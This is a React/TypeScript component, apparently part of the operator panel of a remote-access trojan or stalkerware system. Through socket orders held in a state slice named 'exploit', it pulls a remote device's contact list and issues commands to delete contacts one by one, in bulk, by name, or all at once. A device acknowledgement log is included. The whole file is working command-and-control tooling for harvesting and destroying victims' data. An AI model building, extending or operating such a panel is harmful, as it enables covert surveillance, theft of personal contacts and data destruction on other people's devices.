import { useEffect, useMemo, useState } from 'react'
import { Button } from '@/components/ui/button'
import { Users, RefreshCw, Phone, Trash2, Search, AlertTriangle } from 'lucide-react'
import { emitOrder } from '@/lib/socket'
import { useAppSelector } from '@/store/hooks'

export function ContactsTab({ clientId }: { clientId: string }) {
  const contacts = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.contacts ?? [],
  )
  const acks = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.contactAcks ?? [],
  )

  const [query, setQuery] = useState('')
  const [selected, setSelected] = useState<Set<number>>(new Set())
  const [confirmDelete, setConfirmDelete] = useState<number | null>(null)
  const [confirmAll, setConfirmAll] = useState(false)

  useEffect(() => {
    emitOrder(clientId, 'contacts')
  }, [clientId])

  const filtered = useMemo(() => {
    if (!query) return contacts
    const q = query.toLowerCase()
    return contacts.filter((c: any) =>
      (c.name || '').toLowerCase().includes(q) ||
      (c.number || '').toLowerCase().includes(q),
    )
  }, [contacts, query])

  const toggleSelect = (contactId: number) => {
    const newSet = new Set(selected)
    if (newSet.has(contactId)) newSet.delete(contactId)
    else newSet.add(contactId)
    setSelected(newSet)
  }

  const toggleAll = () => {
    if (selected.size === filtered.length) {
      setSelected(new Set())
    } else {
      setSelected(new Set(filtered.map((c: any) => c.contactId)))
    }
  }

  const deleteOne = (contactId: number) => {
    emitOrder(clientId, 'delete_contact', { contactId })
    setConfirmDelete(null)
  }

  const deleteSelected = () => {
    if (selected.size === 0) return
    if (!confirm('Delete ' + selected.size + ' selected contacts?')) return
    
    emitOrder(clientId, 'delete_contacts_multiple', {
      contactIds: Array.from(selected),
    })
    setSelected(new Set())
  }

  const deleteByName = () => {
    if (!query) return
    if (!confirm(`Delete ALL contacts matching "${query}"?`)) return
    emitOrder(clientId, 'delete_contacts_by_name', { name: query })
  }

  const deleteAll = () => {
    if (!confirm('⚠️ DELETE ALL CONTACTS? This cannot be undone!')) return
    emitOrder(clientId, 'delete_all_contacts')
    setConfirmAll(false)
  }

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Users className="h-4 w-4 text-emerald-400" />
          <h3 className="text-sm font-semibold text-zinc-100">
            Contacts ({contacts.length})
          </h3>
        </div>
        <Button
          variant="outline"
          size="sm"
          onClick={() => emitOrder(clientId, 'contacts')}
          className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
        >
          <RefreshCw className="h-3.5 w-3.5" /> Refresh
        </Button>
      </div>

      {/* Search + Actions */}
      <div className="flex gap-2 flex-wrap">
        <div className="relative flex-1 min-w-[200px]">
          <Search className="absolute left-2 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-zinc-500" />
          <input
            type="text"
            placeholder="Search name or number..."
            value={query}
            onChange={(e) => setQuery(e.target.value)}
            className="w-full rounded-md bg-zinc-900 pl-8 pr-3 py-1.5 text-xs text-zinc-100 placeholder:text-zinc-600 border border-white/10 focus:border-emerald-500/50 focus:outline-none"
          />
        </div>

        <Button
          size="sm"
          onClick={toggleAll}
          variant="outline"
          className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
        >
          {selected.size === filtered.length && filtered.length > 0 ? 'Unselect All' : 'Select All'}
        </Button>

        {selected.size > 0 && (
          <Button
            size="sm"
            onClick={deleteSelected}
            className="bg-rose-500/15 text-rose-300 ring-1 ring-rose-500/30 hover:bg-rose-500 hover:text-white"
          >
            <Trash2 className="h-3.5 w-3.5" /> Delete ({selected.size})
          </Button>
        )}

        {query && (
          <Button
            size="sm"
            onClick={deleteByName}
            variant="outline"
            className="bg-transparent border-rose-500/30 text-rose-300 hover:bg-rose-500/10"
          >
            <AlertTriangle className="h-3.5 w-3.5" /> Delete "{query}"
          </Button>
        )}

        <Button
          size="sm"
          onClick={() => setConfirmAll(true)}
          variant="outline"
          className="bg-transparent border-rose-500/30 text-rose-300 hover:bg-rose-500/10"
        >
          <Trash2 className="h-3.5 w-3.5" /> Delete All
        </Button>
      </div>

      {/* Confirmation Modal */}
      {confirmDelete !== null && (
        <div className="rounded-lg border border-rose-500/30 bg-rose-500/5 p-3 space-y-2">
          <div className="text-xs text-rose-300">
            ⚠️ Delete this contact?
          </div>
          <div className="flex gap-2">
            <Button
              size="sm"
              onClick={() => deleteOne(confirmDelete)}
              className="bg-rose-500 hover:bg-rose-400 text-white"
            >
              Yes, Delete
            </Button>
            <Button
              size="sm"
              onClick={() => setConfirmDelete(null)}
              variant="outline"
              className="bg-transparent border-white/15 text-zinc-300"
            >
              Cancel
            </Button>
          </div>
        </div>
      )}

      {confirmAll && (
        <div className="rounded-lg border border-rose-500/30 bg-rose-500/5 p-3 space-y-2">
          <div className="text-xs text-rose-300 font-semibold">
            ⚠️⚠️ DELETE ALL CONTACTS? This cannot be undone!
          </div>
          <div className="flex gap-2">
            <Button
              size="sm"
              onClick={deleteAll}
              className="bg-rose-500 hover:bg-rose-400 text-white"
            >
              Yes, DELETE ALL
            </Button>
            <Button
              size="sm"
              onClick={() => setConfirmAll(false)}
              variant="outline"
              className="bg-transparent border-white/15 text-zinc-300"
            >
              Cancel
            </Button>
          </div>
        </div>
      )}

      {/* Contacts List */}
      <div className="rounded-xl border border-white/10 overflow-hidden">
        <div className="grid grid-cols-[auto_1fr_1fr_auto] gap-3 bg-zinc-900/60 px-3 py-2 text-[11px] uppercase tracking-wider text-zinc-500 border-b border-white/10">
          <span></span>
          <span>Name</span>
          <span>Number</span>
          <span></span>
        </div>
        <div className="max-h-80 overflow-y-auto scrollbar-emerald divide-y divide-white/5">
          {filtered.length === 0 ? (
            <div className="px-3 py-8 text-center text-xs text-zinc-600">
              {contacts.length === 0 ? 'No contacts fetched.' : 'No match for search'}
            </div>
          ) : (
            filtered.map((c: any, i: number) => (
              <div
                key={i}
                className={`grid grid-cols-[auto_1fr_1fr_auto] gap-3 px-3 py-2 text-xs hover:bg-white/[0.03] items-center ${
                  selected.has(c.contactId) ? 'bg-emerald-500/5' : ''
                }`}
              >
                <input
                  type="checkbox"
                  checked={selected.has(c.contactId)}
                  onChange={() => toggleSelect(c.contactId)}
                  className="h-3.5 w-3.5 accent-emerald-500 cursor-pointer"
                />
                <span className="text-zinc-200 truncate">{c.name}</span>
                <span className="flex items-center gap-1.5 text-zinc-400 font-mono truncate">
                  <Phone className="h-3 w-3 text-zinc-600 shrink-0" />
                  {c.number}
                </span>
                <button
                  onClick={() => setConfirmDelete(c.contactId)}
                  className="text-rose-400/60 hover:text-rose-300 p-1"
                  title="Delete"
                >
                  <Trash2 className="h-3.5 w-3.5" />
                </button>
              </div>
            ))
          )}
        </div>
      </div>

      {/* Acks */}
      {acks.length > 0 && (
        <div className="rounded-lg border border-white/10 bg-black/30 p-2 max-h-32 overflow-y-auto scrollbar-emerald space-y-1">
          {acks.slice(0, 5).map((a: any, i: number) => (
            <div key={i} className="flex items-center gap-2 text-[10px] px-2 py-1">
              <span className="text-zinc-500 shrink-0">{a.time}</span>
              <span className="text-rose-300 font-mono shrink-0">{a.type}</span>
              <span className="text-zinc-400 truncate">
                {JSON.stringify(a.payload).slice(0, 100)}
              </span>
            </div>
          ))}
        </div>
      )}
    </div>
  )
}
